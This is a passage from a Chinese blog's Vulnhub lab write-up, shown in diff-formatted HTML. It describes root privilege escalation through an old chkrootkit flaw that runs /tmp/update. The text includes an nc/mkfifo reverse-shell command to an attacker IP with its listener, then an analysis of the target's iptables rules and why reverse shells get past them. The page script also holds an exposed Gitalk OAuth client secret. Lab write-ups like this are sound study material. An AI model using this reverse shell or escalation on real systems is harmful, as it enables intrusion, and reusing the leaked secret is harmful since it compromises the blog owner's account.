class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">如果 $file_port 为空，则由于变量赋值周围缺少引号，因此行 <span class="string">&#x27;file_port=$file_port $i&#x27;</span> 将在 chkrootkit 运行时（通常是 root）执行 $SLAPPER_FILES 中指定的所有文件。</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">重现步骤：</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">- 将名为 <span class="string">&#x27;update&#x27;</span> 的可执行文件放入 /tmp 中，该文件的所有者为非 root（显然不是挂载的 noexec）</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">- 运行 chkrootkit（作为 uid <span class="number">0</span>）</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">结果：如果文件中放置了恶意内容，则文件 /tmp/update 将以 root 身份执行，从而有效地 root 您的机器。</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">如果攻击者知道您正在定期运行 chkrootkit（例如在 cron.<span class="property">daily</span> 中）并且对 /tmp 具有写访问权限（不是挂载的 noexec），他可能会轻松利用这一点。</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">我们按照它的说法：</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">1.</span>以任意用户新建/tmp/update文件</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">2.</span>将root权限的反弹shell写入/tmp/update</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">3.</span>给他可执行权限：chmod +x /tmp/update</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">靶机：echo <span class="string">&quot;mkfifo /tmp/f;nc 192.168.148.47 8080 0&lt;/tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1;rm /tmp/f&quot;</span> &gt;<span class="regexp">/tmp/u</span>pdate</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">攻击机：nc -nvlp <span class="number">8080</span> </span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">过一段时间获取root权限</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">whoami</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">root</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">id</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="防火墙分析"><a href="#防火墙分析" class="headerlink" title="防火墙分析"></a>防火墙分析</h4><blockquote>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">之前www-data，也就是打点进来的用户是没有权限查看iptables的，现在我们是root权限，可以查看防火墙规则，现在我将详细解释管理员是如何设置iptables的</span><br><span class="line"></span><br><span class="line">iptables -L</span><br><span class="line">结果如下：</span><br><span class="line">Chain INPUT (policy DROP)<span class="number">0</span></span><br><span class="line">target     prot <span class="keyword">opt</span> <span class="keyword">source</span>               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">dp</span><span class="variable">t:ssh</span></span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">dp</span><span class="variable">t:http</span></span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">sp</span><span class="variable">t:http</span>-alt</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">sp</span><span class="variable">t:https</span></span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot <span class="keyword">opt</span> <span class="keyword">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy DROP)</span><br><span class="line">target     prot <span class="keyword">opt</span> <span class="keyword">source</span>               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">sp</span><span class="variable">t:ssh</span></span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">sp</span><span class="variable">t:http</span></span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">dp</span><span class="variable">t:http</span>-alt</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp <span class="keyword">dp</span><span class="variable">t:https</span></span><br><span class="line"></span><br><span class="line">INPUT规则解析</span><br><span class="line">允许出网时要满足的条件（源端口spt为本地端口，目标端口dpt为远程端口）（满足其中一条即可）：</span><br><span class="line"><span class="number">1</span>.允许本地端口<span class="number">22</span>，<span class="number">80</span>出网，远程端口任意</span><br><span class="line"><span class="number">2</span>.允许远程端口<span class="number">8080</span>、<span class="number">443</span>出网，本地端口任意</span><br><span class="line"></span><br><span class="line">OUTPUT规则解析</span><br><span class="line">允许入网时要满足的条件（源端口spt为远程端口，目标端口dpt为本地端口）（满足其中一条即可）：</span><br><span class="line"><span class="number">1</span>.允许本地端口为<span class="number">80</span>，<span class="number">22</span>入网，远程端口任意</span><br><span class="line"><span class="number">2</span>.允许远程端口是<span class="number">443</span>、<span class="number">8080</span>入网，本地端口任意</span><br><span class="line"></span><br><span class="line">综上：</span><br><span class="line">完整通信的满足条件（满足一条就可）：</span><br><span class="line"><span class="number">1</span>.本地端口为<span class="number">22</span>，<span class="number">80</span>，可以完整通信</span><br><span class="line"><span class="number">2</span>.远程端口为<span class="number">443</span>，<span class="number">8080</span>，可以完整通信</span><br><span class="line"></span><br><span class="line">反弹<span class="keyword">shell</span>：</span><br><span class="line">靶机开启一个随机的本地端口，连接远程攻击机器的端口，我们只需要攻击机监听<span class="number">443</span>或、<span class="number">8080</span>端口，满足完整通信的条件<span class="number">2</span>就可以使用反弹<span class="keyword">shell</span>了</span><br><span class="line"></span><br><span class="line">为什么大多情况要使用反弹<span class="keyword">shell</span>，因为反弹<span class="keyword">shell</span>是靶机主动发起的连接，要限制反弹<span class="keyword">shell</span>，管理员就必须限制连接过来的端口号，而大多数情况下，连接过来的端口都是随机的，管理员也不好限制，因为一旦限制就损坏了服务的可用性</span><br></pre></td></tr></table></figure>
+</blockquote>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-14vulnosv2/">Vulnhub-14VulnOSv2</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-12sickos1-1/">Vulnhub-12SickOs1.1</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
